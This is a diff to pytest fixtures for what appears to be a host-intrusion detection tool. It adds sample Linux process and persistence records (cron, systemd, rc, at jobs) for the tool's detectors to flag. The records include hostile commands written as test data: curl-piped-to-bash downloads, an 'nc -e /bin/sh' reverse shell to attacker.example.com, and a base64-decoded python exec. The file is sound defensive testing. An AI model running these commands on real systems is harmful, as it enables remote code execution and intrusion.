@@ -17,9 +17,9 @@ ENV_PREFIX = "SENTINELCLAW_"
 def sample_processes() -> list[dict]:
     """Deterministic process records in the exact shape produced by
     ``sentinelclaw.tools.process_analyzer.get_processes``
-    (keys: pid, ppid, name, parent_name, username, executable, status,
-    memory_percent, command_line, create_time) and consumed by
-    ``sentinelclaw.detectors.process_detector.analyze_processes``.
+    (keys: pid, ppid, name, parent_name, username, executable,
+    exe_deleted, status, memory_percent, command_line, create_time) and
+    consumed by ``sentinelclaw.detectors.process_detector.analyze_processes``.
     """
     return [
         {
@@ -91,6 +91,141 @@ def sample_processes() -> list[dict]:
                 "Hidden",
             ],
             "create_time": "2026-09-08T09:03:00+00:00",
+        },
+    ]
+
+
+@pytest.fixture
+
+def sample_linux_processes() -> list[dict]:
+    """Deterministic Linux-style process records (P1-10), including
+    download-and-execute, reverse-shell, encoded-interpreter, writable-path
+    and deleted-binary indicators. Consumed by
+    ``sentinelclaw.detectors.process_detector.analyze_processes``.
+    """
+    return [
+        {
+            "pid": 31337,
+            "ppid": 1000,
+            "name": "bash",
+            "parent_name": "curl",
+            "username": "analyst",
+            "executable": "/usr/bin/bash",
+            "exe_deleted": False,
+            "status": "running",
+            "memory_percent": 0.5,
+            "command_line": [
+                "bash",
+                "-c",
+                "curl http://x/y.sh | bash",
+            ],
+            "create_time": "2026-09-08T10:00:00+00:00",
+        },
+        {
+            "pid": 31338,
+            "ppid": 31337,
+            "name": "nc",
+            "parent_name": "bash",
+            "username": "analyst",
+            "executable": "/usr/bin/nc",
+            "exe_deleted": False,
+            "status": "running",
+            "memory_percent": 0.2,
+            "command_line": [
+                "nc",
+                "-e",
+                "/bin/sh",
+                "attacker.example.com",
+                "4444",
+            ],
+            "create_time": "2026-09-08T10:00:05+00:00",
+        },
+        {
+            "pid": 31339,
+            "ppid": 1,
+            "name": "python3",
+            "parent_name": "systemd",
+            "username": "analyst",
+            "executable": "/usr/bin/python3",
+            "exe_deleted": False,
+            "status": "running",
+            "memory_percent": 0.3,
+            "command_line": [
+                "python3",
+                "-c",
+                "import base64; exec(base64.b64decode('cGF5bG9hZA=='))",
+            ],
+            "create_time": "2026-09-08T10:00:10+00:00",
+        },
+        {
+            "pid": 31340,
+            "ppid": 1,
+            "name": "bash",
+            "parent_name": "init",
+            "username": "analyst",
+            "executable": "/tmp/evil.sh",
+            "exe_deleted": True,
+            "status": "running",
+            "memory_percent": 0.1,
+            "command_line": [
+                "/tmp/evil.sh",
+            ],
+            "create_time": "2026-09-08T10:00:15+00:00",
+        },
+    ]
+
+
+@pytest.fixture
+
+def sample_persistence_records() -> list[dict]:
+    """Deterministic Linux persistence records (P1-10) covering cron,
+    systemd, rc scripts and at jobs. Consumed by
+    ``sentinelclaw.detectors.persistence_detector.analyze_persistence_records``.
+    """
+    return [
+        {
+            "mechanism": "cron",
+            "path": "/etc/cron.d/backup",
+            "user": "root",
+            "line": 3,
+            "command": "* * * * * curl http://evil.example/x.sh | bash",
+            "content": "* * * * * root curl http://evil.example/x.sh | bash",
+            "world_writable": False,
+        },
+        {
+            "mechanism": "cron",
+            "path": "/var/spool/cron/analyst",
+            "user": "analyst",
+            "line": 1,
+            "command": "*/5 * * * * /tmp/updater.sh",
+            "content": "*/5 * * * * /tmp/updater.sh",
+            "world_writable": False,
+        },
+        {
+            "mechanism": "systemd_unit",
+            "path": "/etc/systemd/system/evil.service",
+            "exec_start": "/usr/bin/python3 /tmp/evil.py",
+            "world_writable": False,
+            "writable_by_others": True,
+        },
+        {
+            "mechanism": "systemd_unit",
+            "path": "/usr/lib/systemd/system/legit.service",
+            "exec_start": "/bin/false",
+            "world_writable": False,
+            "writable_by_others": False,
+        },
+        {
+            "mechanism": "rc_script",
+            "path": "/etc/rc3.d/S99evil",
+            "target": "../init.d/evil",
+            "world_writable": True,
+        },
+        {
+            "mechanism": "at_job",
+            "path": "/var/spool/at/a0001",
+            "command": "/tmp/payload.sh",
+            "world_writable": False,
         },
     ]
 
